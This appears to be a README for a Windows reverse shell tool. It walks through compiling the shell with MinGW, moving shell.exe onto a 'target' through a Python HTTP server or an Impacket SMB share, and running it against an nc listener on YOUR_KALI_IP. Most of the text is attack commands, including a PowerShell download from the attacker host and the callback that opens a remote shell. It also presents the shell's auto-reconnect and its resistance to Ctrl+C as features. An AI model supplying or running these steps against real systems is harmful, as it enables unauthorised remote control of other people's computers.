# Windows Reverse Shell

This is a robust Windows reverse shell that maintains stability and reconnects if the connection drops.

## Prerequisites

To compile this reverse shell, you need `MinGW` installed. Install it based on your OS:

### **🔹 On Kali Linux:**
```sh
sudo apt update
sudo apt install mingw-w64 -y
```

### **🔹 On Windows:**
1. Download MinGW from [Mingw-w64](https://www.mingw-w64.org/downloads/)
2. Install it and add the `bin` folder to your system `PATH`

## Compilation

To compile the reverse shell on **Kali Linux**:
```sh
i686-w64-mingw32-gcc enhanced_shell.c -o shell.exe -lws2_32
```
This generates `shell.exe`, a Windows-compatible executable.

## Transfer to Target Machine

Use one of these methods to transfer `shell.exe` to the target:

### **🔹 Python HTTP Server (Recommended)**
On **Kali Linux**, start a web server:
```sh
python3 -m http.server 8080
```
On the **Windows target**, download the file using PowerShell:
```powershell
Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/shell.exe" -OutFile "shell.exe"
```

### **🔹 SMB (For Internal Networks)**
On **Kali Linux**, use Impacket’s SMB server:
```sh
impacket-smbserver share $(pwd) -smb2support
```
On the **Windows target**, download the file:
```powershell
copy \\YOUR_KALI_IP\share\shell.exe C:\Users\Public\shell.exe
```

## Execution on Target

Start a listener on **Kali Linux**:
```sh
rlwrap nc -lvnp 1337
```
Execute the reverse shell on **Windows**:
```sh
shell.exe YOUR_KALI_IP 1337
```

You should now receive a reverse shell with proper command history and stability.

## Notes
- If the shell disconnects, it will **automatically attempt to reconnect**.
- CTRL+C will **not** terminate the shell on Windows.
- Use `rlwrap` with `nc` for an interactive shell with history.

Happy hacking! 🎯

